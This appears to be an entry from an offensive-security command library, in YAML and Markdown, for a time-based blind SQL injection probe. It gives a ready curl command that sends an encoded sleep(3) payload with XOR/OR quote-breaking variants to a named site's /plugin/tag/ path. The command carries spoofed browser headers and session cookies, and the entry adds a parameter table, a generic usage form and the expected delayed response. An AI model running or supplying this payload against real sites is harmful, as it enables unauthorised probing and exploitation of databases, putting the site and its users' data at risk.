---
data: >-
  curl -s -w "%{time_total}s"
  "https://betterscience.org/plugin/tag/if(now()%3dsysdate()%2csleep(3)%2c0)/%2a'XOR(if(now()%3dsysdate()%2csleep(3)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(3)%2c0))OR%22%2f*"
  -H "Host: betterscience.org" -H "Cookie: [session cookies]" -H "Referer:
  https://betterscience.org/" -H "User-Agent: Mozilla/5.0 (Windows NT 6.1;
  WOW64)..." -H "X-Requested-With: XMLHttpRequest" > /dev/null
tags:
  - sqli
  - injection
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:14.897Z'
id: bc385997-f64e-4a5d-97c5-d87b226bb1a1
verified: false
validated: true
submitted: true
---
# curl-sqli-payload-sleep-3

## Command

```bash
curl -s -w "%{time_total}s" "https://betterscience.org/plugin/tag/if(now()%3dsysdate()%2csleep(3)%2c0)/%2a'XOR(if(now()%3dsysdate()%2csleep(3)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(3)%2c0))OR%22%2f*" -H "Host: betterscience.org" -H "Cookie: [session cookies]" -H "Referer: https://betterscience.org/" -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64)..." -H "X-Requested-With: XMLHttpRequest" > /dev/null
```

## Description

Executes a time-based SQLi payload with 3-second sleep to confirm injection via delay.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-s` | Silent mode | Yes |
| `-w "%{time_total}s"` | Time output | Yes |
| URL payload | Encoded SQL: if(now()=sysdate(),sleep(3),0) with comments | Yes |
| `-H` headers | Mimic browser request | Yes |

## Examples

### Basic Usage

```bash
curl -s -w "%{time_total}s" "https://target/plugin/tag/[encoded-payload]" > /dev/null
```

### Advanced Usage

Include full headers as above.

## Expected Output

Delayed time, e.g., 3.276s.

## Related

- [[commands/curl-baseline-tag-request]]
- [[procedures/Inject-Time-Based-SQL-Payload-with-3-Second-Delay]]
